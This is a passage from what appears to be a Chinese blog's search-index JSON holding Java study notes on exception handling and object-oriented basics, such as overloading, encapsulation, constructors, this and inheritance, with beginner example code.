      while (data != -1){\n                    System.out.println((char)data);\n                    data = fis.read();\n            }\n\n        }catch (FileNotFoundException e){\n            e.getMessage();\n        }catch (IOException e){\n            e.getMessage();\n        }catch (Exception e){\n            e.getMessage();\n        }finally {\n            try{  // try-catch可以相互嵌套\n                if(fis != null)  //避免空指针异常\n                    fis.close(); //连接不会自动释放\n            }catch (Exception e){\n                e.getMessage();\n            }\n            System.out.println(\"finally\");\n        }\n\n    }\n\n}\n\n```\n\n\n\n\n\n### 异常处理2：throws + 异常类型\n\n```java\npackage cn.xpshuai.day12;\n/*\n\n1. \"throws + 异常类型\"写在方法的声明处。指明此方法执行时，可能会抛出的异常类型。\n一旦当方法体执行时，出现异常，仍会在异常代码处生成一个异常类的对象，此对象满足throws后异常类型时,就会被抛出。异常代码后续的代码,就不再执行!\n\n2．体会:try-catch-finally:真正的将异常给处理掉了。\nthrows的方式只是将异常抛给了方法的调用者。并设有真正将异常处理掉。\n\n3.子类抛出的异常不能大于父类的\n子类重写的方法抛出的异常类型不大于父类被重写的方法抛出的异常类型\n\n4.开发中如何选择使用try-catch-finally 还是使用throws?\n4.1 如果父类中被重写的方法没有throws方式处理异常，则子类重写的方法也不能使用throws，意味着如果\n子类重写的方法中有异常，必须使用try-catch-finally方式处理。\n4.2 执行的方法a中，先后又调用了另外的几个方法，这几个方法是递进关系执行的。我们建议这几个方法使用throw的方式进行处理。而执行的方法a可以考虑使用try-catch-finally方式进行处理。|\n\n\n\n\n\n\n */\nimport org.junit.Test;\n\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\n\npublic class ThrowsTest {\n    public static void main(String[] args) {\n        try{\n            method2();\n        }catch (Exception e){\n            e.getMessage();\n        }\n    }\n\n    // 向上通报，抛给上面\n//    @Test\n    public static void method1() throws FileNotFoundException, IOException {\n        File file = new File(\"test1.txt\");\n        FileInputStream fis = new FileInputStream(file);\n        int data = fis.read();\n        while (data != -1) {\n            System.out.println((char) data);\n            data = fis.read();\n        }\n    }\n\n    // 这里调用method1了，所以method1的异常就抛到method2了\n    public static void method2()  throws FileNotFoundException, IOException{\n        method1();\n        // method2处理不了，也往上抛\n\n    }\n\n\n\n}\n\n```\n\n\n\n### 手动抛出异常：throw\n\n```java\nclass Student{\n    private int id;\n    public void register(int id) throws Exception{\n        if (id >0){\n            this.id = id;\n        }else{\n            //手动抛出异常对象\n            throw new Exception(\"输入数据非法\"); //编译和运行时都有了，throws给上层处理\n//            throw new RuntimeException(\"输入数据非法！\"); // 运行时异常\n\n        }\n    }\n}\n```\n\n\n\n### 用户自定义异常类\n\n```java\n/*\n用户自定义异常类\n1.继承现有异常结构：RuntimeException . Exception\n2.提供全局常量：serialVersionUID\n3.提供重载的构造器\n\n */\npublic class SelfMakeExpection extends Exception{\n    static final long serialVersionUID = -7034897190745777777L;\n\n    public SelfMakeExpection() {\n        super();\n    }\n\n    public SelfMakeExpection(String msg) {\n        super(msg);\n    }\n}\n\n```\n\n调用自定义异常类：\n\n```java\nclass Student{\n    private int id;\n    public void register(int id) throws Exception{\n        if (id >0){\n            this.id = id;\n        }else{\n            //手动抛出异常对象\n//            throw new Exception(\"输入数据非法\"); //编译和运行时都有了，throws给上层处理\n//            throw new RuntimeException(\"输入数据非法！\"); // 运行时异常\n             throw new SelfMakeExpection(\"自定义异常类：出现错误啦~~~\");\n        }\n    }\n}\n\n```\n\n","tags":["异常处理"],"categories":["Java学习"]},{"title":"Java学习之面向对象初识","url":"%2Fposts%2F3433%2F","content":"\n### 面向对象概述\n\n**面向对象三大特征：**\n\n- 封装（Encapsulation）\n- 继承（Inheritance）\n- 多态（Polymorphism）\n\n**类和类成员：**属性、方法、构造器(前三个重要)；代码块、内部类\n\n**其他关键字：**this, super, static, final, abstract, interface, package, import\n\n\n\n**属性(成员变量)和局部变量：**\n\n```java\n* 同：\n    *  定义格式：数据类型 变量名 = 变量值\n    *  先声明后使用\n    *  都有其作用域\n    * \n* 异：\n    *  1.声明位置不同\n    * \t\t属性:直接定义在{}内\n        *  \t局部变量：声明在方法内部、方法形参、代码块内、构造器形参、构造器内部的变量\n        *  2.关于权限修饰符的不同\n        *  \t属性：可以在声明属性时候使用权限修饰符\n        *  \t\t如：public  private，  缺省， protected\n        *  \t局部变量：不能用权限修饰符\n        *  3.默认初始化值\n        *  \t属性：类的属性，根据其类型有初始化默认值\n        *  \t局部变量：没有默认初始化值（意味着，我们在调用局部变量的时候一定要显式赋值）\n        *  \t\t\t特别的，形参在调用时赋值即可\n        *  4.二者在内存中加载的位置\n        *  \t属性：加载到堆空间(非static)\n        *  \t局部变量：加载到栈空间\n```\n\n**方法：**\n\n```java\n *  定义格式：\n *  权限修饰符  返回值类型 方法名(形参列表){\n *  \t方法体\n *  }\n *  注意：static、final、abstract来修饰的方法，后面再讲\n *  \n *  1.四种权限修饰符：public、private、缺省、 protected\n *  2.返回值类型；\n *  \t有返回值 vs 无返回值(void,通常不需要return，非要写的话就return;)\n *  \treturn之后不可以跟语句了\n```\n\n\n\n**类的基本结构：**\n\n```java\npackage cn.xpshuai.test;\n\npublic class PersonTest {\n\tpublic static void main(String[] args) {\n\t\t\n\t}\n}\n\n\n\nclass Person{\n\t// 【属性】 = 成员变量 = field = 字段、域\n\tString name;\n\tint age;\n\tboolean isMarried;\n\t// 构造器\n\tpublic Person(){}\n\tpublic Person(String n, boolean im) {\n\t\tname = n; isMarried = im;\n\t}\n\t\n\t\n\t// 【方法】 = 成员方法 = 函数 = method\n\tpublic void walk() {\n\t\tSystem.out.println(\"人走路...\");\n\t}\n\tpublic String display() {\n\t\treturn  \"名字：\" + name + \"婚否：\" + isMarried;\n\t}\n\t\n\t// 代码块(出现的较少)\n\t{\n\t\tname = \"韩梅梅\";\n\t\tage = 17;\n\t\tisMarried = true;\n\t}\n\t\n\t// 内部类(出现的较少)\n\tclass pet{\n\t\tString name;\n\t\tfloat weight;\n\t}\n\t\n}\n\n```\n\n\n\n小练习：\n\n```java\npackage cn.xpshuai.test;\n/*\n * 对Stedent.java的改进\n * */\n\n\npublic class StudentsTest {\n\tpublic static void main(String[] args) {\n\t\t// 声明 Students类型的数组\n\t\tStudents[] stus = new Students[20];\n\t\t\n\t\t// 给数组元素赋值\n\t\tfor (int i = 0; i < stus.length; i++) {\n\t\t\tstus[i] = new Students();\n\t\t\t//给对象元素的属性赋值\n\t\t\tstus[i].num = i + 1;\n\t\t\tstus[i].state = (int)(Math.random() * (6-1+1)+1);\n\t\t\tstus[i].score = (int)(Math.random() * (100-0+1));\n\t\t}\n\t\t\n\t\t// 实例化类对象\n\t\tStudentsTest testStu = new StudentsTest();\n\t\t\n\t\t//输出指定年级的学生\n\t\ttestStu.searchState(stus, 3);\n\t\t\n\t\t// 冒泡从小到大排序学生成绩\n\t\ttestStu.BubbleSort(stus);\n\t\t\n\t\tSystem.out.println(\"----------------排序完成---------------\");\n\t\t// 遍历输出显示学生信息(排序之后的)\n\t\ttestStu.printStutent(stus);\n\t}\n\t\n\t/** 遍历student数组操作的方法\n\t * @param stus\n\t */\n\tpublic void printStutent(Students[] stus) {\n\t\tfor (int i = 0; i < stus.length; i++) {\n\t\t\tSystem.out.println(stus[i].info());\n\t\t}\n\t\t\n\t}\n\n\t/** 找指定年级的学生的方法\n\t * \n\t * @author XPS\n\t * @param stus 要查找的数组\n\t * @param sta  要找的年级\n\t */\n\tpublic void searchState(Students[] stus, int sta) {\n\t\tfor (int i = 0; i < stus.length; i++) {\n\t\t\tif(stus[i].state == sta) {\n\t\t\t\tSystem.out.println(sta + \"年级学生：\" + stus[i].info());\n\t\t\t}\n\t\t}\n\t\t\n\t}\n\t\n\t\n\t/**\n\t *  给Students数组冒泡排序的方法\n\t * @param stu\n\t */\n\tpublic void BubbleSort(Students[] stu) {\n\t\tfor (int i = 0; i < stu.length-1; i++) {\n\t\t\tfor (int j = 0; j < stu.length-1-i; j++) {\n\t\t\t\tif(stu[j].score > stu[j+1].score) {\n\t\t\t\t\t//交换的是Student对象的顺序\n\t\t\t\t\tStudents temp = stu[j];\n\t\t\t\t\tstu[j] = stu[j+1];\n\t\t\t\t\tstu[j+1] = temp;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t\n}\n\n\nclass Students{\n\tint num; // 学号\n\tint state; // 年级\n\tint score; //成绩\n\t\n\t//显示学生信息的方法\n\tpublic String info() {\n\t\treturn \"学号：\" + num + \"，年级\" + state + \"，成绩：\" + score;\n\t}\n}\n```\n\n\n\n\n\n### **匿名对象**\n\n```java\npackage cn.xpshuai.testc;\n\npublic class InstanceTest {\n\tpublic static void main(String[] args) {\n\t\tPhone p1 = new Phone();\n\t\tSystem.out.println(p1);\n\t\tp1.sendEmail();\n\t\t\n\t\t// 匿名对象（new的对象没有赋值给变量名） -->只能调用一次\n\t\tnew Phone().sendEmail(); // 没有吧实例化的对象赋值给变量，可以直接调用方法\n\t\tnew Phone().price = 1999;\n\t\tnew Phone().showPrice(); // 新new的对象，是另外一个了，不能用第二次了\n\t\n\t\tPhoneMall mall = new PhoneMall();\n\t\tmall.show(new Phone());  // 这种情况下使用匿名对象较多\n\t\t\n\t}\n}\n\nclass Phone{\n\tdouble price;\n\t\n\tpublic void sendEmail() {\n\t\tSystem.out.println(\"发邮件\");\n\t}\n\tpublic void playGame() {\n\t\tSystem.out.println(\"打游戏\");\n\t}\n\tpublic void showPrice() {\n\t\tSystem.out.println(\"价格为：\" + price);\n\t}\n}\n\n\nclass PhoneMall{\n\tpublic void show(Phone p) {\n\t\tp.sendEmail();\n\t\tp.playGame();\n\t}\n}\n```\n\n\n\n### 方法的重载(overload)\n\n> 区分与后面的重写\n\n\n\n**重载：**在同一个类中，允许存在—个以上的<font color=red>同名方法</font>，只要它们的<font color=red>参数个数或参数类型不同</font>即可。\n\n**特点：**与返回值类型无关，<font color=red>只看参数列表</font>，且参数列表必须不同(参数个数或参数类型)。调用时，根据方法参数列表的不同来区别。\n\n如下两个同名方法构成了重载：\n\n```java\npublic class{\n   //如下两个同名方法构成了重载\n\t//反转数组（形参是整数数组）\n\tpublic void reverseArr(int[] arr) {\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tint tmp = arr[i];\n\t\t\tarr[i] = arr[arr.length-i-1];\n\t\t\tarr[arr.length-i-1] = tmp;\n\t\t}\n\t}\n\t//反转数组(形参是字符数组)\n\tpublic void reverseArr(String[] arr) {\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tString tmp = arr[i];\n\t\t\tarr[i] = arr[arr.length-i-1];\n\t\t\tarr[arr.length-i-1] = tmp;\n\t\t}\n\t}\n    \n    \n}\n```\n\n\n\n### 可变个数的形参（新特性）\n\n> jdk5.0新增的内容\n\n* \t格式：func(数据类型 ... 参数名)\n * \t当调用可变个数形参方法时，传入参数**个数可为 0到多个**\n * \t可变个数形参的方法与本类中方法名相同，形参不同的方法之间**构成重载**\n * \t可变个数形参在方法的形参中，必须声明在**末尾**（形参列表的最后一个位置）\n *  可变个数形参在方法的形参中,最多**只能声明一个**可变形参。\n\n```java\n/*\n * 使用场景：sql查询数据时候，where后面的条件中不知道写几个的时候\n * */\npublic class ArgumentsTest {\n\t\n\tpublic static void main(String[] args) {\n\t\tArgumentsTest a = new ArgumentsTest();\n\t\ta.show(11);\n\t\ta.show(\"hello\");\n\t\ta.show(\"hello\", \"world\");\n\t\ta.show(new String[] {\"AAA\", \"BBB\", \"CCC\"});\n\t}\n\t\n\tpublic void show(int i){\n\t\t\n\t}\n\t\n\tpublic void show(String s){\n\t\t\n\t}\n\t\n\t// 新特性：可变个数形参(都能识别)\n\tpublic void show(String ... strs){\n\t\tfor (int i = 0; i < strs.length; i++) {\n\t\t\tSystem.out.println(strs[i]);   //调用方法一样\n\t\t}\n\t\t\n\t}\n//\t// 在jdk5.0之前，都是用数组来传递多个参数，和上面的是不可共存的(不构成重载)\n//\tpublic void show(String []... strs){\n//\t\t\n//\t}\n}\n\n```\n\n\n\n### 方法参数的值传递机制\n\n**关于变量的赋值：**\n\n * 如果变量是基本数据类型：此时赋值的是变量所保存的数据值\n * 如果变量是引用数据类型：此时赋值的是变量所指向的地址\n\n\n\n**方法形参的传递机制：**【值传递机制】\n\n * 如果参数是基本数据类型，此时实参赋给形参的是实参真实存储的数据值。\n * 如果参数是引用数据类型，此时实参赋给形参的是实参存储数据的地址值。\n\n```java\npublic class ValueTranslation {\n\tpublic static void main(String[] args) {\n\t\tSystem.out.println(\"*********基本数据类型**********\"); \n\t\tint m = 10;\n\t\tint n = m;\n\t\t\n\t\tSystem.out.println(m + \"\\t\" + n);\n\t\t\n\t\tn = 20;\n\t\tSystem.out.println(m + \"\\t\" + n);  // n变了之后，m是不变的\n\t\t\n\t\t\n\t\tSystem.out.println(\"*********引用数据类型**********\"); \n\t\t\n\t\tOrder o1 = new Order();\n\t\to1.id =1001;\n\t\t\n\t\tOrder o2 = o1;\n\t\t\n\t\tSystem.out.println(o1.id + \"\\t\" + o2.id);  // 1002\n\t\to2.id =1002;\n\t\tSystem.out.println(o1.id + \"\\t\" + o2.id); // o1也为1002（两个地址值相同，指向堆空间中同一个区域）\n\t\t\n\t\t\n\t\tSystem.out.println(\"*********方法形参的值传递**********\");\n\t\t// 交换两个变量的值\n\t\tint i = 10;\n\t\tint j = 20;\n\t\tSystem.out.println(i + \"\\t\" + j);\n\t\t// 交换两个变量的值的操作\n\t\tValueTranslation test = new ValueTranslation();\n\t\ttest.swap1(i, j); //调用方法，没换成（是基本数据类型，传递的参数的值，只是在swap作用域里面发生了交换）\n\t\tSystem.out.println(i + \"\\t\" +  j);\n\t\t\n\t\tSystem.out.println(\"*********方法形参的引用数据类型传递**********\");\n\t\tData data = new Data();\n\t\tdata.x = 10;\n\t\tdata.y = 20;\n\t\tSystem.out.println(data.x + \"\\t\" +  data.y);\n\t\tValueTranslation test2 = new ValueTranslation();\n\t\ttest2.swap2(data); //调用方法，换成了（是引用数据类型，交换的是堆空间的地址值）\n\t\t\n\t\tSystem.out.println(data.x + \"\\t\" +  data.y);\n\t\t\n\t\t\n\t}\n\t\n\t\n\tpublic void swap1(int i, int j) {\n\t\tint tmp = i;\n\t\ti = j;\n\t\tj = tmp;\n\t}\n\t\n\t// 引用传递类型\n\tpublic void swap2(Data data) {\n\t\tint tmp = data.x;\n\t\tdata.x = data.y;\n\t\tdata.y = tmp;\n\t}\n\t\n}\n\n\nclass Order{\n\tint id;\n\t\n}\n\n\nclass Data{\n\tint x;\n\tint y;\n}\n\n```\n\n\n\n![](http://image.xpshuai.cn/%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B%E4%B8%BA%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.jpg)\n\n![](http://image.xpshuai.cn/%E5%8F%82%E6%95%B0%E7%B1%BB%E5%9E%8B%E4%B8%BA%E5%BC%95%E7%94%A8%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B.png)\n\n但是，String作为引用数据类型，是例外的，是不能交换成功的，因为它存在字符串常量池中，会新造一个地址。所以，记下面这个结论：\n\n * 如果变量是基本数据类型：此时赋值的是变量所保存的数据值\n * 如果变量是引用数据类型：此时赋值的是变量所指向的地址\n\n\n\n**自定义封装Arrayutil类：**\n\n```java\npackage cn.xpshuai.testc;\n/*\n * 自定义封装数组的工具类\n */\n\n\npublic class ArayUtil {\n\t//求数组最大值\n\tpublic int getMax(int[] arr) {\n\t\tint max = 0;\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tif (arr[i] > max) {\n\t\t\t\tmax = arr[i];\n\t\t\t}\n\t\t}\n\t\t\n\t\treturn max;\n\t}\n\t\n\t//求数组最小值\n\tpublic int getMin(int[] arr) {\n\t\tint min = 0;\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tif (arr[i] < min) {\n\t\t\t\tmin = arr[i];\n\t\t\t}\n\t\t}\n\t\treturn min;\n\t}\n\t\n\t//求数组总和\n\tpublic int getSum(int[] arr) {\n\t\tint sum = 0;\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tsum += arr[i];\n\t\t}\n\t\treturn sum;\n\t}\n\t\n\t//求数组平均值\n\tpublic int getMiddle(int[] arr) {\n\t\treturn getSum(arr) / arr.length;  // 方法中调用方法\n\t}\n\t\n\t//如下两个同名方法构成了重载（调用哪个取决你参数的类型）\n\t//反转数组\n\tpublic void reverseArr(int[] arr) {\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tint tmp = arr[i];\n\t\t\tarr[i] = arr[arr.length-i-1];\n\t\t\tarr[arr.length-i-1] = tmp;\n\t\t}\n\t}\n\t//反转数组\n\tpublic void reverseArr(String[] arr) {\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tString tmp = arr[i];\n\t\t\tarr[i] = arr[arr.length-i-1];\n\t\t\tarr[arr.length-i-1] = tmp;\n\t\t}\n\t}\n\t\n\t//复制数组(区别于数组变量的赋值：arr1=arr)\n\tpublic int[] copyArr(int[] arr) {\n\t\tint[] arr2 = new int[arr.length];\n\t\tfor (int i = 0; i < arr2.length; i++) {\n\t\t\tarr2[i] = arr[i];\n\t\t}\n\t\treturn arr2;\n\t}\n\t\n\t// 数组遍历\n\tpublic void printArr(int[] arr) {\n\t\tSystem.out.print(\"{\");\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tSystem.out.print(arr[i] + \", \");\n\t\t}\n\t\tSystem.out.print(\"}\");\n\t}\n\t\n\t\n\t// 数组排序(冒泡为例), 不用return\n\tpublic void sortArr(int[] arr) {\n\t\tfor (int i = 0; i < arr.length-1; i++) {\n\t\t\tfor (int j = 0; j < arr.length-1-i; j++) {\n\t\t\t\tif(arr[j] > arr[j+1]) {\n\t\t\t\t\t//交换的是Student对象的顺序\n//\t\t\t\t\tint temp = arr[j];\n//\t\t\t\t\tarr[j] = arr[j+1];\n//\t\t\t\t\tarr[j+1] = temp;\n\t\t\t\t\t\n\t\t\t\t\t// 错误的。不能传递基本数据类型\n//\t\t\t\t\tswap(arr[j], arr[j+1]);\n\t\t\t\t\t// 正确的\n\t\t\t\t\tswap(arr, j, j+1);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\t\n\tpublic void swap(int[] arr, int i, int j) {\n\t\tint tmp = arr[i];\n\t\tarr[i] = arr[j];\n\t\tarr[j] = tmp;\n\t}\n\t\n\t//查找指定元素(这里 线性查找)\n\tpublic int getIndex(int[] arr, int dest){\n\t\tfor (int i = 0; i < arr.length; i++) {\n\t\t\tif(arr[i] == dest) {\n\t\t\t\treturn 1; // 返回索引值\n\t\t\t}\n\t\t}\n\t\treturn -1;  //返回-1表示没找到\n\t}\n\t\n\t\n\t/// ...\n}\n\n```\n\n\n\n**画内存图**\n\n1.内存结构：\n\n​\t\t\t栈（局部变量）\n\n  \t\t  堆（new出来的结构：对象、数组）\n\n2.变量：成员变量&局部变量（方法内、方法形参、构造器内、构造器形参、代码块内）\n\n\n\n\n\n### <font color=red>封装性</font>\n\n隐藏对象内部的复杂性，只对外公开简单的接口。便于外界调用，从而提高系统的可扩展性、可维护性。通俗的说，**把该隐藏的隐藏起来，该暴露的暴露出来**。这就是封装性的设计思想。\n\n封装性与隐藏：\n\n```java\n 在对对象发属性进行赋值时，赋值操作要受到数据类型和存储范围的制约。除此之外没有其他制约条件。但是，在实际问题中，我们往往需要给属性赋值\n *加入额外的限制条件，这个条件就不能再属性声明时候体现，我们只能通过方法进行限制条件的添加。\n * 同时我们需要避免用户再使用\"对象.属性\"方式进行赋值，则需要将属性声明为private\n * -->此时针对属性，就体现了封装性\n```\n\n封装性体现：\n```java\n1.我们将类的属性私有化(private),同时，提供公共的(public)方法来获取(getXXX)和设置(setXXX)此属性的值\n2.不对外暴露私有方法\n3.单例模式\n4. ... ...\n\n```\n\n权限修饰符：\n```java\n * 封装性的体现需要权限修饰符来配合：\n * 1.java规定的四种权限(从小到大排序)：private、缺省(即default，不用写的时候)、protected、public\n * 详细见笔记\n * 2.四种权限可以用来修饰类及类的内部结构：属性、方法、构造器、内部类\n * 3.具体的，四种权限都可以用来修饰内部结构：属性、方法、构造器、内部类\n * 修饰类的话：只能用public 和 缺省\n```\n\n**封装性总结：**\n\nJava提供了4种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。\n\n```java\npublic class AnimalTest {\n\tpublic static void main(String[] args) {\n\t\tAnimal a = new Animal();\n\t\t//a.name = \"大黄\";\n\t\t//a.age = 2;\n\t\t//a.legs = 4;  //禁止用户直接访问属性(权限修饰符 private)，让他访问setLegs()\n\t\t//a.legs = -4;  // 负数肯定是不符合实际的，应该加限制只让输入正偶数\n\t\ta.setName(\"大黄\");\n\t\ta.setAge(2);\n\t\ta.setLegs(6);\n\t\ta.show();\n\t\t\n\t\t\n\t\t// 测试权限\n\t\tOrderTest o1 = new OrderTest();\n\t\to1.b = 111;\n\t\to1.c = 222;\n\t\t// o1.a   调不了了(出了类，私有属性和方法就不能被调用)\n\t\to1.test2();\n\t\to1.test3();\n\t\t// o1.test1();  调不了\n\t\t\n\t\t\t\t\n\t}\n}\n\n\nclass Animal{\n\tprivate String name;\n\tprivate int age;\n\tprivate int legs; //腿个数, 私有的，禁止暴露在外面\n\t\n\t//对属性的设置\n\t// set, 把处理逻辑卸载里面封装起来\n\tpublic void setLegs(int l) {\n\t\tif(l >= 0 && l % 2 == 0) {\n\t\t\tlegs = l;\n\t\t}else {\n\t\t\tlegs = 0;\n\t\t}\n\t}\n\t\n\t//对属性的获取：get方法, 返回属性值\n\tpublic int getLegs() {\n\t\treturn legs;\n\t}\n\t\n\tpublic void setAge(int a){\n\t\tif(a >= 0) {\n\t\t\tage = a;\n\t\t}else {\n\t\t\tage = 0;\n\t\t}\n\t}\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\t\n\tpublic void setName(String n){\n\t\tname = n;\n\t}\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\t\n\t\n\tpublic void eat() {\n\t\tSystem.out.println(\"动物进食\");\n\t}\n\tpublic void show() {\n\t\tSystem.out.println(\"动物的名字\" + name + \"，年龄：\" + age + \"，腿个数：\" + legs);\n\n\t}\n}\n\n```\n\n\n\n权限测试例子：\n\n```java\npublic class OrderTest2 {  // 不同包下，可以起同名的类\n\tpublic static void main(String[] args) {\n\t\t// 测试权限\n\t\t// 出了Order类所属的包之后，私有、缺省的结构都不可以调用了\n\t\tOrderTest o1 = new OrderTest();\n\t\t//o1.b = 111;  // 缺省的也调用不了了\n\t\to1.c = 222;\n\t\t// o1.a   调不了了(出了类，私有属性和方法就不能被调用)\n\t\t//o1.test2();\n\t\to1.test3();\n\t\t// o1.test1();  调不了\n\t\t\n\t}\n}\n\n```\n\n![](http://image.xpshuai.cn/java%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6.png)\n\n\n\n\n\n### 构造器\n\n**特征：**\n\n- 它具有与类相同的名称\n- 它不声明返回值类型(与声明为void不同)\n- 不能被static、final、synchronized、abstract、native修饰，不能有return语句返回值\n\n\n\n**作用：**创建对象，初始化对象的属性\n\n**注意：**\n\n * 如果没有显式的定义类构造器的话，则系统**默认**提供一个**空参**的构造器\n * 定义构造器的格式：**权限修饰符 类名(形参列表){}**\n * 构造器 **不是方法**\n * 一个类中定义多个构造器构成重载\n * 一旦显式的定义类的构造器，系统就不再提供默认的空参构造器\n * 一个类中，**至少**会有**一个**构造器\n\n如下：\n\n```java\npublic class PeopleTest {\n\tpublic static void main(String[] args) {\n\t\t// 创建类对象\n\t\tPeople p = new People(\"Tom\", 18);  //形参在创建对象时候就赋值了属性\n\t\tp.walk();\n\t}\n}\n\n\nclass People{\n\tString name;\n\tint age;\n\t\n\t// 构造器\n\tpublic People(){\n\t\tSystem.out.println(\"构造器1被调用...\");\n\t}\n\t// 构造器的重载\n\tpublic People(String n){\n\t\tSystem.out.println(\"构造器1被调用...\");\n\t\tname = n;    //形参在创建对象时候就赋值了属性\n\t}\n\tpublic People(String n, int a){\n\t\tSystem.out.println(\"构造器1被调用...\");\n\t\tname = n;    //形参在创建对象时候就赋值了属性\n\t\tage = a;\n\t}\n\n\tpublic void walk() {\n\t\tSystem.out.println(\"人走路...\");\n\t}\n\n}\n```\n\n\n\n**总结-属性赋值过程(按优先顺序)：**\n\n1. 默认初始化\n2. 显式初始化\n3. 构造器中初始化\n4. 通过`对象.属性`或`对象.方法`的方式赋值\n\n\n\n### JavaBean\n\nJavaBean：是一种Java语言写成的可重用组件。\n\n\n\n**所谓javaBean，是指符合如下标准的Java类:**\n\n- 类是公共(public)的\n- 有一个无参的公共的构造器\n- 有属性，且有对应的getXXX、setXXX方法\n\n**满足这样三个条件的一个类，就叫JavaBean**\n\n\n\n> 也可以通过反射来造对象\n\n\n\n\n\n### UML类图\n\n![](http://image.xpshuai.cn/UML%E7%B1%BB%E5%9B%BE.jpg)\n\n\n\n\n\n### this关键字\n\n- this表示当前对象，可以调用类的属性、方法和构造器\n- 它在方法内部使用，即这个方法所属对象的引用\n- 它在构造器内部使用，表示该构造器正在初始化的对象\n\n```java\npackage cn.xpshuai.www;\n/*\n * this关键字\n * \n * this修饰属性和方法\n * this理解为：当前对象 或 当前正在创建的对象(构造器中)\n * \n * 【在类的方法中】，我们可以使用\"this.属性\"或\"this.方法\"的方式，调用当前对象属性或方法。但是,通常情况下,我们都选择省略\"this.\"。\n* 特殊情况下，如果方法的形参和类的属性同名时，我们必须显式使用\"this.变量\"的方式，来表名次变量是属性而非形参\n* 同样，【在构造器中】，我们可以使用\"this.属性\"或\"this.方法\"的方式，调用当前正在创建的对象属性或方法。但是,通常情况下,我们都选择省略\"this.\"。I\n* 特殊情况下，如果方法的形参和类的属性同名时，我们必须显式使用\"this.变量\"的方式，来表名次变量是属性而非形参\n *\n *\n *\n * 【this调用构造器】\n * 1.我们在类的构造器中，可以使用显式的使用\"this(形参列表);\"方式，调用本类中其他的构造器\n * 2.构造器中不能使用\"this(形参列表);\"方式调用自己\n * 3.如果一个类中有n和构造器，则最多有n-1个构造器中使用了\"this(形参列表);\"\n * 4.\"this(形参列表);\"必须声明在当前构造器的首行\n * 5.构造器内部不能同时调用两个\"this(形参列表);\"\n * \n */\npublic class ThisTEst {\n\tpublic static void main(String[] args) {\n\t\tPeople2 p1 = new People2(\"Tom\", 12);\n\t\tSystem.out.println(p1.getAge());\n\t\t\n\t}\n}\n\nclass People2{\n\tString name;\n\tint age;\n\t\n\t// 构造器（如果写下面的带参数的构造器，必须先写上空的构造器）\n\tpublic People2(){\n\t\tSystem.out.println(\"构造器1被调用...\");\n\t\tthis.eat(); // 使用this调用方法\n\t}\n\t\n\tpublic People2(String name){\n\t\tthis();  //调用上面的构造器1\n\t\tSystem.out.println(\"构造器2被调用...\");\n\t\tthis.name = name;    \n\t}\n\t\n\tpublic People2(String name, int age){\n\t\tthis(name);  //调用上面的构造器2，方式冗余\n//\t\tthis.name = name;   // 那么下面就不需要这行的name了 \n\t\tthis.age = age;\n\t\tSystem.out.println(\"构造器3被调用...\");\n\t}\n\n\t\n\t//set\n\tpublic void setName(String name) {\n\t\tthis.name = name;   //使用this(当前对象)区分：当前对象的name=name\n\t}\n\t//get\n\tpublic String getName() {\n\t\treturn this.name;\n\t}\n\t\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\tpublic int getAge() {\n\t\treturn this.age;\n\t}\n\n\n\tpublic void walk() {\n\t\tSystem.out.println(\"人走路...\");\n\t}\n\n}\n\n```\n\n\n\nEclipse快速生成get和set等方法：`alt + seift +s`快捷键就可以看到啦\n\nEclipse快速生成get和set等方法：`alt +insert `快捷键就可以看到啦\n\n\n\n### package\n\n```java\n * package关键字的使用：\n * 1.为了实现更好项目中类的管理，提出了“包”的概念\n * 2.使用package声明类或者接口所属的包，声明在源文件的首行\n * 3.包，属于标识符，遵循标识符命名规范(小写)、见名知意\n * 4.每\".\"一次，就代表一层文件目录\n * \n * 补充：同一个包下，不能命名同名的接口、类, 不同包下可以命名同名的接口、类\n```\n\n\n\n\n\n\n\n### <font color=red>继承性</font>\n\n- Java**只支持单继承和多层继承**，不允许多重继承\n- Object类是所有类的根父类\n\n\n\n**简单例子如下：**\n\n测试类：\n\n```java\npackage cn.xpshuai.java;\n/* \n * 继承好处：\n * 1.减少代码冗余，提高代码复用\n * 2.便于功能拓展\n * 3.为了以后多态使用，提供了前提\n * \n * 格式： class A extends B{}\n * A:子类、派生类、subclass\n * B：父类、超类、基类、superclass\n * \n * 体现：一旦子类A继承父类B以后，子类A中就获取了父类B中声明的所有的 属性、方法\n * 特别的，父类中声明为私有的属性和方法，子类仍获取到了，只是由于封装性影响-->使得子类不能直接调用而已\n * \n * 子类继承父类以后，还可以声明自己特有的属性或方法:实现功能的拓展。\n * \n * \n * \n * 规定：\n * 1.一个类只能有一个父类\n * 2.Java只支持单继承和多层继承\n * 3.直接父类、间接父类。子类继承父类以后，就获取了直接父类以及所有间接父类中声明的属性和方法\n * \n * \n * 如果我们没有显式的声明一个类的父类的话，则此类继承于java.lang.Object类\n * 所有的Java类，都直接或间接的继承Object类\n */\n\npublic class ExtendsTest {\n\tpublic static void main(String[] args) {\n\t\tPerson p1 = new Person(\"张三\", 18);\n\t\tp1.eat();\n\t\t\n\t\tStudent s1 = new Student(\"GIS\");\n\t\ts1.setName(\"张三三\");\n\t\ts1.setAge(22);\n\t\t// 父类中的方法，子类中也可以调用 来实现复用\n\t\ts1.show();\n//\t\tSystem.out.println(s1.getMajor());\n\t}\n}\n\n```\n\n父类：\n\n```java\npackage cn.xpshuai.java;\n\npublic class Person {\n\tprivate 